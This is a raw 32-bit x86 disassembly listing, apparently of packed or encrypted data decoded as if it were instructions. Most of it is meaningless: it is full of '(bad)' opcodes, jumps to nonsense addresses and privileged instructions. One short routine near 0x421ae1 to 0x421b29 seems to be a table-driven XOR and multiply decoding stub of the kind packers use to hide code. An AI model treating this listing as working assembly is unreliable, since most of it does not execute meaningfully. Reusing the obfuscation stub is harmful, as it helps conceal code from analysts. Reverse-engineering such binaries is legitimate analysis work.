  421783:	and    BYTE PTR [esi],cl
  421785:	or     BYTE PTR [bx+si-0x5fb6],dl
  42178a:	mov    ?,WORD PTR [esp+edx*2+0x205241c2]
  421791:	mov    eax,ds:0x2a08f43e
  421796:	mov    eax,ds:0x783d4cb4
  42179b:	xchg   ebp,eax
  42179c:	retf   
  42179d:	jns    0x42177b
  42179f:	retf   
  4217a0:	jo     0x42175d
  4217a2:	(bad)  
  4217a3:	pop    esp
  4217a4:	push   esi
  4217a5:	jp     0x4217e7
  4217a7:	sbb    eax,0x326cf54e
  4217ac:	push   es
  4217ad:	mov    bh,BYTE PTR [ebx-0x11]
  4217b0:	push   0xe387436
  4217b5:	dec    edi
  4217b6:	bound  esp,QWORD PTR [ecx+0x7d]
  4217b9:	adc    eax,0xa2285eca
  4217be:	in     eax,dx
  4217bf:	xor    cl,BYTE PTR [edi-0x3a3745db]
  4217c5:	mov    DWORD PTR [ebp-0x3e052794],edi
  4217cb:	xchg   esp,eax
  4217cc:	cld    
  4217cd:	add    esi,DWORD PTR [edi+0x17]
  4217d0:	pushf  
  4217d1:	repz das 
  4217d3:	dec    esp
  4217d4:	in     eax,0x52
  4217d6:	mov    edx,DWORD PTR [ebx]
  4217d8:	push   0x79
  4217da:	pop    edx
  4217dc:	sar    DWORD PTR [esi+0x5fe16249],cl
  4217e2:	adc    edx,esp
  4217e4:	mov    ecx,0x4586e125
  4217e9:	push   esi
  4217ea:	stos   DWORD PTR es:[edi],eax
  4217eb:	mov    cl,0x1c
  4217ed:	pop    ecx
  4217ee:	jns    0x421868
  4217f0:	cmp    BYTE PTR [ebp+0x35],ah
  4217f3:	mov    BYTE PTR ds:0x8840cb70,bl
  4217f9:	test   eax,0xc5286d44
  4217fe:	data16 arpl WORD PTR [ecx+0x1d517e08],si
  421805:	jl     0x4217ea
  421807:	xchg   edx,eax
  421808:	mov    ch,0xae
  42180a:	fidiv  WORD PTR [ebx+0x347c91d9]
  421810:	jbe    0x421881
  421812:	mov    ecx,ebx
  421814:	inc    edi
  421815:	pop    ebx
  421816:	push   edi
  421817:	sub    esp,DWORD PTR [edx+edx*1+0x24]
  42181b:	mov    cl,0x23
  42181d:	mov    dl,0xe2
  42181f:	xor    BYTE PTR [esi+0x38fa30b6],cl
  421825:	stc    
  421826:	cs inc eax
  421828:	xchg   edx,eax
  421829:	(bad)  
  42182a:	mov    DWORD PTR [edi-0x2c],0xaaf7ddfe
  421831:	(bad)  
  421832:	mov    dh,0x6f
  421834:	dec    ecx
  421835:	lods   al,BYTE PTR ds:[esi]
  421836:	and    ebp,eax
  421838:	mov    ch,0x45
  42183a:	xlat   BYTE PTR ds:[ebx]
  42183b:	mov    ebp,0x2edc79c6
  421840:	cld    
  421841:	jne    0x4217e6
  421843:	adc    BYTE PTR [ebx+0x5a],dl
  421846:	retf   0xdbec
  421849:	sbb    edx,DWORD PTR [ebp-0x3a]
  42184c:	xchg   BYTE PTR [ebx],bl
  42184e:	pop    esp
  42184f:	fldcw  WORD PTR [ecx+ebp*2+0xb7dfeb1]
  421856:	adc    ecx,edx
  421858:	(bad)  
  421859:	ins    DWORD PTR es:[edi],dx
  42185a:	dec    edi
  42185b:	jl     0x4217f3
  42185d:	ror    DWORD PTR ds:0x5468a41a,1
  421863:	int    0x92
  421865:	adc    edx,eax
  421867:	in     eax,dx
  421868:	(bad)  [eax-0x49]
  42186b:	mov    ah,0x11
  42186d:	jg     0x4217fc
  42186f:	xchg   edx,eax
  421870:	shr    edx,0x7b
  421873:	outs   dx,BYTE PTR ds:[esi]
  421874:	or     BYTE PTR [edx],bh
  421876:	or     eax,0x9c853b1d
  42187b:	mov    WORD PTR [edx-0x4f],?
  42187e:	ret    
  42187f:	xchg   esi,eax
  421880:	fwait
  421881:	dec    ebx
  421882:	mov    dl,0x58
  421884:	adc    DWORD PTR [ebx+ebp*1-0x1d],ebp
  421888:	add    ebx,ebp
  42188a:	test   BYTE PTR [ebx+0xc],ch
  42188d:	stos   DWORD PTR es:[edi],eax
  42188e:	sahf   
  42188f:	adc    eax,0x22562c6c
  421894:	pop    ebp
  421895:	jnp    0x421868
  421897:	dec    eax
  421898:	test   DWORD PTR [edx],edx
  42189a:	add    eax,0x69be7086
  42189f:	xor    ah,BYTE PTR [edi+0x67c31a38]
  4218a5:	ret    0xe3a
  4218a8:	jo     0x4218c8
  4218aa:	outs   dx,BYTE PTR ds:[esi]
  4218ab:	mov    dh,0x7c
  4218ad:	sahf   
  4218ae:	les    eax,FWORD PTR [ecx+0x36]
  4218b1:	lock jnp 0x421862
  4218b4:	loopne 0x421862
  4218b6:	mov    esi,0x426d82b4
  4218bb:	je     0x4218a3
  4218bd:	int3   
  4218be:	add    BYTE PTR [eax],0xb2
  4218c1:	xor    BYTE PTR ds:0x8a695f66,bl
  4218c7:	inc    esi
  4218c8:	call   0x3771e4bf
  4218cd:	lea    ecx,ds:0x9c51fd50
  4218d3:	mov    edx,0x4a0c371d
  4218d8:	push   esi
  4218d9:	inc    esp
  4218da:	sti    
  4218db:	jle    0x42192c
  4218dd:	int    0xaf
  4218df:	mov    al,0x78
  4218e1:	sbb    eax,0x483a3edc
  4218e6:	pushf  
  4218e7:	psadbw mm4,mm7
  4218ea:	out    dx,eax
  4218eb:	popa   
  4218ec:	jle    0x4218c0
  4218ee:	out    0x32,eax
  4218f0:	sar    BYTE PTR [edi-0x71],1
  4218f3:	mov    WORD PTR [esi-0x3f],fs
  4218f6:	(bad)  
  4218f7:	in     al,0x8
  4218f9:	mov    ah,BYTE PTR [edx-0x80]
  4218fc:	and    dh,al
  4218fe:	push   ds
  4218ff:	jl     0x4218de
  421901:	mov    ah,0x41
  421903:	jl     0x4218da
  421905:	sar    BYTE PTR [edi+0x30],1
  421908:	add    ecx,0x38a54364
  42190e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42190f:	aad    0xaa
  421911:	mov    bh,0xaf
  421913:	cmp    al,0x47
  421915:	enter  0x2e6a,0x6
  421919:	cli    
  42191a:	xchg   ebp,eax
  42191b:	loopne 0x4218b5
  42191d:	xor    BYTE PTR ds:0x6d2a4118,cl
  421923:	fisttp QWORD PTR ds:0x376477ab
  421929:	add    BYTE PTR [edi-0x1],al
  42192c:	shl    DWORD PTR [ebx],cl
  42192e:	sub    eax,0x65bd7164
  421933:	(bad)  
  421934:	pusha  
  421935:	std    
  421936:	and    al,0xa2
  421938:	lock fst DWORD PTR [eax-0x1f]
  42193c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42193d:	cmp    al,0x47
  42193f:	cmc    
  421940:	in     al,dx
  421941:	das    
  421942:	(bad)  
  421943:	inc    edx
  421944:	das    
  421945:	push   ss
  421946:	fnstcw WORD PTR [eax-0x52d20a40]
  42194c:	lea    edx,[ebp-0x2c]
  42194f:	jno    0x42197c
  421951:	(bad)  
  421952:	jge    0x421904
  421954:	loop   0x4219c8
  421956:	mov    ch,BYTE PTR [ecx-0x533fdbd5]
  42195c:	leave  
  42195d:	(bad)  
  42195e:	push   ebp
  42195f:	push   ebp
  421960:	jns    0x421959
  421962:	add    bh,BYTE PTR [ecx+0x4538fbdc]
  421968:	bound  esi,QWORD PTR [esp+eiz*2]
  42196b:	jns    0x421972
  42196d:	call   0x7d8e33c0
  421972:	stos   BYTE PTR es:[edi],al
  421973:	add    BYTE PTR [ecx-0x9570f5d],0xc
  42197a:	mov    eax,ds:0x5421c961
  42197f:	in     eax,dx
  421980:	in     al,dx
  421981:	adc    ecx,DWORD PTR [ebp+0x42de759]
  421987:	adc    BYTE PTR [edx],dh
  421989:	mov    eax,ds:0x8bd34add
  42198e:	stos   DWORD PTR es:[edi],eax
  42198f:	data16 (bad) 
  421992:	test   al,0x29
  421994:	popw   ss
  421996:	mov    cl,0x39
  421998:	jne    0x42196f
  42199a:	xor    al,0x79
  42199d:	stos   BYTE PTR es:[edi],al
  42199e:	inc    edx
  42199f:	inc    eax
  4219a0:	add    BYTE PTR [eax],dl
  4219a2:	out    0xbc,eax
  4219a4:	mov    dh,0x40
  4219a6:	dec    edx
  4219a7:	push   ds
  4219a8:	pop    ebx
  4219a9:	fdivr  QWORD PTR [edx]
  4219ab:	xchg   BYTE PTR [ebx-0x1e5f408a],bh
  4219b1:	nop
  4219b2:	fstp   st(5)
  4219b4:	shr    ebp,cl
  4219b6:	test   DWORD PTR [ecx-0x37782523],0x87d19dba
  4219c0:	xchg   ebx,eax
  4219c1:	xor    eax,0xa5f7cc46
  4219c6:	add    edi,0x14
  4219c9:	shl    edi,cl
  4219cb:	dec    edi
  4219cc:	retf   
  4219cd:	nop
  4219ce:	inc    ecx
  4219cf:	inc    esp
  4219d0:	int3   
  4219d1:	fwait
  4219d2:	add    al,BYTE PTR [ecx+0x307128c]
  4219d8:	or     BYTE PTR [ecx+0x1],bl
  4219db:	xor    al,0x29
  4219dd:	stos   BYTE PTR es:[edi],al
  4219de:	xchg   edx,eax
  4219df:	push   edi
  4219e0:	xor    BYTE PTR fs:[esi],al
  4219e3:	xchg   edi,eax
  4219e4:	pop    ds
  4219e5:	inc    ecx
  4219e6:	push   cs
  4219e7:	mov    al,0x1a
  4219e9:	jb     0x421a47
  4219eb:	jbe    0x421a5e
  4219ed:	and    al,0x3e
  4219ef:	cmp    DWORD PTR [ecx-0x4e2e8b19],esp
  4219f5:	or     DWORD PTR [edi],0xc
  4219f8:	xor    cl,BYTE PTR [esi-0x6a]
  4219fb:	shl    BYTE PTR ds:0x1985f78f,cl
  421a01:	adc    eax,ecx
  421a03:	test   DWORD PTR [ebp+0x52],esp
  421a06:	lahf   
  421a07:	cmp    eax,0xed8013ee
  421a0c:	bound  esp,QWORD PTR [esi+0x7d]
  421a0f:	xchg   ebx,eax
  421a10:	xchg   edx,eax
  421a11:	xlat   BYTE PTR ds:[ebx]
  421a12:	push   eax
  421a13:	mov    ds:0x48bfb07a,eax
  421a18:	loopne 0x421a39
  421a1a:	js     0x4219bd
  421a1c:	jns    0x421a89
  421a1e:	add    BYTE PTR ds:0x2b4c960f,ch
  421a24:	add    edx,DWORD PTR [ecx+0x73]
  421a27:	pusha  
  421a28:	cmp    BYTE PTR [edx+0x56],bl
  421a2b:	jb     0x4219bb
  421a2d:	mov    ebx,0x6c59f26c
  421a32:	adc    edx,ecx
  421a34:	cli    
  421a35:	pop    ecx
  421a36:	lock push 0xc306ed2b
  421a3c:	jbe    0x421abd
  421a3e:	jp     0x4219c5
  421a40:	cs je  0x421a90
  421a43:	jns    0x421a2e
  421a45:	xlat   BYTE PTR ds:[ebx]
  421a46:	fs jge 0x421a61
  421a49:	sti    
  421a4a:	call   0xc692:0x90744239
  421a51:	pop    ebp
  421a52:	dec    edx
  421a53:	dec    ebp
  421a54:	lock daa 
  421a56:	mov    edi,DWORD PTR [ebx-0x62805c26]
  421a5c:	ja     0x421a1c
  421a5e:	mov    gs,esi
  421a60:	sahf   
  421a61:	das    
  421a62:	jmp    0x421a40
  421a64:	xchg   edx,eax
  421a65:	icebp  
  421a66:	mov    ecx,0x73c7c488
  421a6b:	fs popf 
  421a6d:	rcr    BYTE PTR [esp+edi*1-0x3d],0x4a
  421a72:	mov    esp,0x31e4591e
  421a77:	retf   
  421a78:	test   al,0xa6
  421a7a:	jbe    0x421ae5
  421a7c:	inc    esp
  421a7d:	jmp    0x6a93:0xab3bd259
  421a84:	cli    
  421a85:	mov    ah,0xe0
  421a87:	int3   
  421a88:	dec    ebp
  421a89:	pop    ds
  421a8a:	inc    eax
  421a8b:	add    BYTE PTR [ebx+0x7b],0xf2
  421a8f:	sbb    bh,ah
  421a91:	xor    edx,ebx
  421a93:	daa    
  421a94:	sub    eax,0xc0eb06cd
  421a99:	sbb    al,dh
  421a9b:	pop    DWORD PTR [ecx+0x3a76b993]
  421aa1:	(bad)  
  421aa2:	dec    ebp
  421aa3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421aa4:	iret   
  421aa5:	loopne 0x421a2c
  421aa7:	aas    
  421aa8:	popa   
  421aa9:	jle    0x421abc
  421aab:	mov    esi,0x9faf0625
  421ab0:	in     al,0x55
  421ab2:	mov    esi,0x6106094c
  421ab7:	or     al,0x4b
  421ab9:	out    dx,eax
  421aba:	jo     0x421ad0
  421abc:	add    bh,BYTE PTR [ecx]
  421abe:	push   edx
  421abf:	push   ebp
  421ac0:	jp     0x421ac7
  421ac2:	jp     0x421a6a
  421ac4:	xor    BYTE PTR [edx+eax*2-0x4c10fd35],ah
  421acb:	call   0x13c72a56
  421ad0:	add    BYTE PTR [eax],al
  421ad2:	add    BYTE PTR [ebx],bh
  421ad4:	pop    ebp
  421ad5:	hlt    
  421ad6:	je     0x423f0d
  421adc:	jmp    0x421ae6
  421ae1:	mov    esi,0x3272f8
  421ae6:	mov    eax,DWORD PTR [ebp-0x4]
  421ae9:	mov    edi,DWORD PTR [ebp-0x8]
  421aec:	xor    edi,edx
  421aee:	add    edi,esi
  421af0:	mov    esi,DWORD PTR [ebp+0x8]
  421af3:	imul   edi,ecx
  421af6:	mov    ebx,DWORD PTR [ebp+0xc]
  421af9:	xor    eax,edx
  421afb:	add    eax,ecx
  421afd:	mov    al,BYTE PTR [ebx+eax*1+0x3272f8]
  421b04:	mov    BYTE PTR [edi+esi*1],al
  421b07:	mov    eax,DWORD PTR [ebp-0x8]
  421b0a:	mov    esi,DWORD PTR [ebp+0x10]
  421b0d:	xor    eax,edx
  421b0f:	xor    ebx,ebx
  421b11:	add    esi,0xfabdbecf
  421b17:	adc    ebx,0xffffffff
  421b1a:	lea    ecx,[ecx+eax*1+0x3272f8]
  421b21:	xor    edi,edi
  421b23:	xor    esi,0x8a29a145
  421b29:	jmp    0x423ee8
  421b2e:	int    0x95
  421b30:	stos   BYTE PTR es:[edi],al
  421b31:	jmp    0xff36:0x517a
  421b37:	dec    ebx
  421b38:	jnp    0x421b18
  421b3a:	xchg   ebx,ebx
  421b3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421b3d:	sbb    eax,0x7b7c4723
  421b42:	sbb    eax,0x807b7b9e
  421b47:	jns    0x421b8d
  421b49:	call   0xf106:0x22be2b5
  421b50:	pusha  
  421b51:	jecxz  0x421b2e
  421b53:	out    dx,al
  421b54:	imul   ebx,DWORD PTR [edi],0xffffff91
  421b57:	sub    al,0xd6
  421b59:	ins    DWORD PTR es:[edi],dx
  421b5a:	and    eax,ecx
  421b5c:	jmp    0x4012:0x6b959951
  421b63:	or     dh,BYTE PTR [ebx-0x39]
  421b66:	test   eax,0xacd0b5a6
  421b6b:	add    DWORD PTR [eax-0x52],edx
  421b6e:	cmc    
  421b6f:	mov    esi,0x1b6bd4dd
  421b74:	(bad)  
  421b75:	(bad)  
  421b76:	mov    esp,0xbb94b4b8
  421b7b:	and    al,0x95
  421b7d:	cmc    
  421b7e:	sub    DWORD PTR ds:0x7a83eb89,ebx
  421b84:	call   0x5536:0xb35eebe4
  421b8b:	push   esi
  421b8c:	out    0xf2,eax
  421b8e:	xor    al,0x27
  421b90:	ret    
  421b91:	jns    0x421b58
  421b93:	imul   esi,DWORD PTR [eax*1+0x76001b89],0x7a4fa509
  421b9e:	jmp    0x59778525
  421ba3:	adc    DWORD PTR cs:[ecx-0x7d],esp
  421ba7:	mov    ds:0x88df990,eax
  421bac:	push   ds
  421bad:	mov    esi,0x203ea38c
  421bb2:	(bad)  
  421bb3:	gs gs jne 0x421bca
  421bb7:	push   ss
  421bb8:	or     DWORD PTR [edi+0x69],0xffffff84
  421bbc:	pusha  
  421bbd:	push   esi
  421bbe:	gs jl  0x421c01
  421bc1:	loopne 0x421b96
  421bc3:	push   ss
  421bc4:	pop    ss
  421bc5:	inc    edx
  421bc6:	add    ah,BYTE PTR [esp+edi*8+0x752dce23]
  421bcd:	in     al,dx
  421bce:	minps  xmm0,xmm3
  421bd1:	dec    ebp
  421bd2:	push   eax
  421bd3:	rcr    BYTE PTR [ecx],1
  421bd5:	mov    ch,0x72
  421bd7:	sahf   
  421bd8:	add    dl,BYTE PTR [edi]
  421bda:	pushf  
  421bdb:	ja     0x421c2f
  421bdd:	test   ecx,ebx
  421bdf:	popa   
  421be0:	call   0xcd68:0x5338aa94
  421be7:	in     eax,0x79
  421be9:	sub    ebx,esi
  421beb:	in     eax,dx
  421bec:	hlt    
  421bed:	aam    0x86
  421bef:	xor    ah,BYTE PTR [eax]
  421bf1:	add    eax,0x55f2e4a0
  421bf6:	mov    ebp,0x571b1e96
  421bfb:	cmp    DWORD PTR [edx-0x654bce0b],0x135f233c
  421c05:	sti    
  421c06:	mov    ds:0x68b49043,al
  421c0b:	fdivr  DWORD PTR [ebx+0x69]
  421c0e:	jle    0x421c53
  421c10:	jne    0x421c77
  421c12:	inc    esi
  421c13:	pop    ss
  421c14:	cmp    DWORD PTR [ecx-0x7ebf815f],ebx
  421c1a:	mov    ah,0x8c
  421c1c:	xchg   edi,eax
  421c1d:	sub    BYTE PTR [edi],ah
  421c1f:	bound  esp,QWORD PTR [eax-0x7a]
  421c22:	(bad)  
  421c24:	xchg   ebx,eax
  421c25:	jnp    0x421c4f
  421c27:	pop    esi
  421c28:	or     BYTE PTR [esi],bl
  421c2a:	neg    ebp
  421c2c:	in     eax,0xb
  421c2e:	test   BYTE PTR [ecx-0x3dff480],cl
  421c34:	push   eax
  421c35:	adc    DWORD PTR [eax],eax
  421c37:	out    0xb1,al
  421c39:	sub    bh,bh
  421c3b:	ror    eax,cl
  421c3d:	aaa    
  421c3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c3f:	pop    ebp
  421c40:	dec    edx
  421c41:	lahf   
  421c42:	adc    eax,0x5948a5db
  421c47:	add    al,0x7
  421c49:	sbb    ch,0x1e
  421c4c:	mov    es,WORD PTR [esi+0x87d89cf]
  421c52:	sbb    al,0x8f
  421c54:	pop    eax
  421c55:	inc    edx
  421c56:	inc    ecx
  421c57:	leave  
  421c58:	and    BYTE PTR [edi+esi*1-0x3953a829],0xa3
  421c60:	mov    edi,esi
  421c62:	dec    edx
  421c63:	jl     0x421c20
  421c65:	retf   0xb748
  421c68:	call   0x3a44:0xa35a692f
  421c6f:	lods   al,BYTE PTR ds:[esi]
  421c70:	inc    ecx
  421c71:	iret   
  421c72:	hlt    
  421c73:	fidivr DWORD PTR [edi+0x212bae99]
  421c79:	jbe    0x421c52
  421c7b:	jle    0x421c66
  421c7d:	(bad)  
  421c7f:	mov    eax,ds:0x4bfadcd
  421c84:	loop   0x421ca6
  421c86:	loop   0x421ce0
  421c88:	jns    0x421cc5
  421c8a:	or     BYTE PTR [ecx-0x61],bl
  421c8d:	div    BYTE PTR [edx-0x760202c7]
  421c93:	lea    ebx,[eax-0x19]
  421c96:	cmp    BYTE PTR [edi],al
  421c98:	cmc    
  421c99:	and    eax,DWORD PTR ds:0xde808c0d
  421c9f:	jo     0x421c40
  421ca1:	ins    BYTE PTR es:[edi],dx
  421ca2:	pop    ebx
  421ca3:	jb     0x421cbf
  421ca5:	stos   DWORD PTR es:[edi],eax
  421ca6:	aam    0xd0
  421ca8:	mov    edx,0xc256fa3b
  421cad:	xchg   DWORD PTR [esi],edx
  421caf:	stos   DWORD PTR es:[edi],eax
  421cb0:	or     DWORD PTR [edx],0xffffff89
  421cb3:	push   edi
  421cb4:	jle    0x421cdd
  421cb6:	and    al,BYTE PTR [esi-0x7d7b552d]
  421cbc:	xchg   esi,eax
  421cbd:	sbb    al,0x44
  421cbf:	enter  0x7b1f,0xd0
  421cc3:	test   DWORD PTR [eax+0x72522cff],ebp
  421cc9:	fnstcw WORD PTR ss:[edi+eax*8+0x6f]
  421cce:	mov    dl,0x32
  421cd0:	in     eax,0xb5
  421cd2:	ret    
  421cd3:	jp     0x421cbb
  421cd5:	push   esp
  421cd6:	retf   0xb07c
  421cd9:	fdiv   QWORD PTR [ebp+0x4f9ade65]
  421cdf:	xor    al,cl
  421ce1:	adc    dh,dl
  421ce3:	(bad)  
  421ce5:	mov    ah,0x1
  421ce7:	xchg   ebx,eax
  421ce8:	es push es
  421cea:	stos   BYTE PTR es:[edi],al
  421ceb:	and    BYTE PTR [eax+0x21285925],al
  421cf1:	inc    ebx
  421cf2:	bound  esp,QWORD PTR [ebx+0x67]
  421cf5:	imul   edi,DWORD PTR [edx+0x1d474573],0x2d
  421cfc:	add    DWORD PTR [ecx+0x7d451fe9],ecx
  421d02:	sbb    ah,ah
  421d04:	sub    eax,0xddcacb5c
  421d09:	push   ebp
  421d0a:	and    al,bh
  421d0c:	daa    
  421d0d:	idiv   BYTE PTR [edi]
  421d0f:	xor    BYTE PTR [ecx],bh
  421d11:	(bad)  
  421d12:	test   edi,edx
  421d14:	add    al,0x9
  421d16:	stos   BYTE PTR es:[edi],al
  421d17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d18:	into   
  421d19:	add    al,0xe4
  421d1b:	rol    DWORD PTR [edi-0x47],cl
  421d1e:	jne    0x421cf6
  421d20:	lds    ebx,FWORD PTR [ecx-0x27]
  421d23:	push   esi
  421d24:	repnz (bad) 
  421d26:	out    0x21,al
  421d28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d29:	pusha  
  421d2a:	add    eax,0x3f3cbcff
  421d2f:	int    0x4
  421d31:	jecxz  0x421cc1
  421d33:	loopne 0x421d45
  421d35:	adc    BYTE PTR [esi+0x75],bl
  421d38:	inc    ebp
  421d39:	add    DWORD PTR fs:[eax+0x22],esp
  421d3d:	xor    DWORD PTR [edx-0x16],ebp
  421d40:	pop    edx
  421d41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d42:	cmp    ah,BYTE PTR [eax+0x3c5cc8a3]
  421d48:	mov    esp,0xe151a79e
  421d4d:	ja     0x421d87
  421d4f:	pusha  
  421d50:	cmp    al,0xc7
  421d52:	push   esi
  421d53:	out    0x1f,eax
  421d55:	test   DWORD PTR [ecx-0x22c9d9b9],esp
  421d5b:	mov    esp,?
  421d5d:	jge    0x421d02
  421d5f:	mov    bl,0x5e
  421d61:	mov    esp,0x533efccd
  421d66:	loopne 0x421daf
  421d68:	mov    gs,WORD PTR [ecx+ecx*2+0x5eaa1652]
  421d6f:	in     al,0xbe
  421d71:	mov    ss,WORD PTR [ecx-0x7c]
  421d74:	sti    
  421d75:	ins    BYTE PTR es:[edi],dx
  421d76:	jmp    0x1703b89e
  421d7b:	pop    ebp
  421d7c:	shl    BYTE PTR [ecx],0xce
  421d7f:	pushf  
  421d80:	aaa    
  421d81:	test   eax,0xc664274d
  421d86:	add    ebx,DWORD PTR [ecx+0x95ae4fc]
  421d8c:	outs   dx,DWORD PTR ds:[esi]
  421d8d:	sub    DWORD PTR [esi],ebx
  421d8f:	push   ebp
  421d90:	and    edi,ebx
  421d92:	mov    dh,0xd8
  421d94:	sbb    eax,0x606b1bc1
  421d99:	sub    esp,ebp
  421d9b:	popa   
  421d9c:	mov    WORD PTR [ebx+0xe347c],?
  421da2:	add    eax,ecx
  421da4:	fisubr DWORD PTR [edi]
  421da6:	pop    ebx
  421da7:	mov    esi,0x43fa6d04
  421dac:	pop    edi
  421dad:	int    0x43
  421daf:	and    BYTE PTR [edi],cl
  421db1:	xchg   esi,eax
  421db2:	sub    al,0x4b
  421db4:	pop    ds
  421db5:	push   es
  421db6:	and    DWORD PTR [ecx+0x470f7470],eax
  421dbc:	seta   BYTE PTR [ecx+ebp*4-0x2bd21ef2]
  421dc4:	jbe    0x421d7d
  421dc6:	bound  ebx,QWORD PTR [ecx]
  421dc8:	mov    bl,0xf6
  421dca:	sahf   
  421dcb:	xlat   BYTE PTR ds:[ebx]
  421dcc:	loope  0x421e31
  421dce:	popf   
  421dcf:	sbb    DWORD PTR [ebx-0x1e54fdb1],edx
  421dd5:	lds    esp,FWORD PTR [edx+0x56]
  421dd8:	mov    dh,BYTE PTR [esp+edi*4]
  421ddb:	add    DWORD PTR [ebx+0x49],0xffffff84
  421ddf:	jne    0x421dc8
  421de1:	ins    DWORD PTR es:[edi],dx
  421de2:	rol    DWORD PTR [esi-0x57],cl
  421de5:	dec    ecx
  421de6:	jge    0x421d68
  421de8:	out    0xcb,eax
  421dea:	xor    al,0xb0
  421dec:	call   0xc029:0x7d299167
  421df3:	inc    ebp
  421df4:	and    dh,dl
  421df6:	inc    esi
  421df7:	ss push esi
  421df9:	dec    ecx
  421dfa:	test   bl,dl
  421dfc:	xchg   DWORD PTR [ebp-0x74],eax
  421dff:	daa    
  421e00:	stc    
  421e01:	add    bh,bl
  421e03:	retf   0x1832
  421e06:	push   0x34
  421e08:	push   edx
  421e09:	add    eax,0xd846e5dd
  421e0e:	ret    
  421e0f:	jns    0x421e59
  421e11:	xchg   dl,ah
  421e13:	jmp    0xb2bab29e
  421e18:	cmp    al,0x9f
  421e1a:	xor    cl,cl
  421e1c:	stos   BYTE PTR es:[edi],al
  421e1d:	(bad)  
  421e1e:	mov    edx,0x16d5dfbf
  421e23:	out    0x7b,al
  421e25:	add    ah,BYTE PTR [eax]
  421e27:	pop    ebx
  421e28:	loopne 0x421e36
  421e2a:	pushf  
  421e2b:	shr    DWORD PTR [ecx+0x35],cl
  421e2e:	inc    esi
  421e2f:	shr    DWORD PTR [ebp-0x19102d81],cl
  421e35:	fsub   st,st(7)
  421e37:	inc    ebx
  421e38:	adc    DWORD PTR [eax-0x2aca6308],edi
  421e3e:	addr16 xchg ebx,eax
  421e40:	out    dx,al
  421e41:	(bad)
  421e44:	es cmc 
  421e46:	xchg   edi,eax
  421e47:	dec    edx
  421e48:	dec    ebp
  421e49:	lods   eax,DWORD PTR ds:[esi]
  421e4a:	les    ebp,FWORD PTR [ebx-0x11]
  421e4d:	cwde   
  421e4e:	fist   WORD PTR [ecx-0x66]
  421e51:	test   DWORD PTR [ebp-0x7f6b70dc],0xe01d09f4
  421e5b:	(bad)  
  421e5c:	sub    bl,bl
  421e5e:	inc    ebx
  421e5f:	adc    DWORD PTR [edx],ebx
  421e61:	fist   WORD PTR [edi+0x16f459c9]
  421e67:	and    ebp,DWORD PTR [ebp-0x6b]
  421e6a:	mov    esp,0x3fce882
  421e6f:	and    DWORD PTR [esp+eax*8-0x227d69b8],edi
  421e76:	sub    BYTE PTR [eax-0x5b],bh
  421e79:	mov    dl,0x34
  421e7b:	repz jp 0x421eae
  421e7e:	int    0x72
  421e80:	push   eax
  421e81:	jne    0x421edb
  421e83:	sti    
  421e84:	jecxz  0x421ee9
  421e86:	(bad)  
  421e88:	adc    bl,bh
  421e8a:	mov    dh,0x67
  421e8c:	sub    esp,edi
  421e8e:	adc    DWORD PTR [ebx-0x14],esp
  421e91:	scas   al,BYTE PTR es:[edi]
  421e92:	bound  edi,QWORD PTR [eax]
  421e94:	shl    BYTE PTR [edx+ebx*1-0x6],1
  421e98:	je     0x421ef0
  421e9a:	pop    ebp
  421e9b:	mov    bh,0x8a
  421e9d:	jl     0x421e76
  421e9f:	jns    0x421e9a
  421ea1:	mov    ch,0x24
  421ea3:	mov    dl,0x68
  421ea5:	xor    esp,DWORD PTR [ebx]
  421ea7:	js     0x421efe
  421ea9:	jecxz  0x421f1f
  421eab:	inc    esi
  421eac:	add    esp,DWORD PTR [esi+0x7b42dc19]
  421eb2:	sbb    al,0xaa
  421eb4:	xchg   esi,eax
  421eb5:	sub    DWORD PTR [eax],esp
  421eb7:	push   0x13
  421eb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421eba:	jmp    0xdba053e7
  421ebf:	xor    DWORD PTR [esi-0x7fee5ecb],ecx
  421ec5:	ror    DWORD PTR [edx],cl
  421ec7:	jg     0x421ec2
  421ec9:	jg     0x421eb4
  421ecb:	test   eax,0x5c21f6ae
  421ed0:	daa    
  421ed1:	arpl   WORD PTR [edx+0x301a9205],sp
  421ed7:	dec    ecx
  421ed8:	push   eax
  421ed9:	mov    ah,0x1
  421edb:	cs jo  0x421e8b
  421ede:	js     0x421f06
  421ee0:	push   0xdead4c87
  421ee5:	mov    ebx,0x3dea4b77
  421eea:	mov    ?,WORD PTR [edx+0x29ce01ac]
  421ef0:	imul   DWORD PTR [eax-0x74]
  421ef3:	xor    al,BYTE PTR [edx+0x64]
  421ef6:	push   ebp
  421ef7:	xlat   BYTE PTR ds:[ebx]
  421ef8:	inc    ecx
  421ef9:	add    DWORD PTR [ebx+0x24],0x229ce61e
  421f00:	xchg   DWORD PTR [edi],edi
  421f02:	repz leave 
  421f04:	call   FWORD PTR [edi]
  421f06:	mov    ch,0xa5
  421f08:	xor    cl,ah
  421f0a:	mov    ebp,0x939035c
  421f0f:	ret    
  421f10:	ret    
  421f11:	out    0x3f,eax
  421f13:	repz pop ecx
  421f15:	sbb    BYTE PTR [ecx+0x5f02c8a3],cl
  421f1b:	(bad)  
  421f1c:	std    
  421f1d:	push   edi
  421f1e:	leave  
  421f1f:	icebp  
  421f20:	shl    esi,0x9a
  421f23:	test   BYTE PTR [eax+0x1cd824e1],0x5e
  421f2a:	lahf   
  421f2b:	and    ebx,DWORD PTR [ebx+0xd]
  421f2e:	inc    ebp
  421f2f:	pusha  
  421f30:	rol    BYTE PTR [eax],1
  421f32:	and    bh,0x51
  421f35:	mov    eax,0xc74e0786
  421f3a:	or     dl,ch
  421f3c:	push   ds
  421f3d:	adc    BYTE PTR cs:[ecx],bh
  421f40:	test   DWORD PTR [edx+0x7d],0x988fc608
  421f47:	cmp    BYTE PTR [eax-0x460cb662],ah
  421f4d:	lock ret 
  421f4f:	fldenv [eax]
  421f51:	scas   eax,DWORD PTR es:[edi]
  421f52:	pusha  
  421f53:	ss ret 
  421f55:	cdq    
  421f56:	xchg   BYTE PTR [edi-0x7762bb6a],dh
  421f5c:	push   cs
  421f5d:	outs   dx,DWORD PTR ds:[esi]
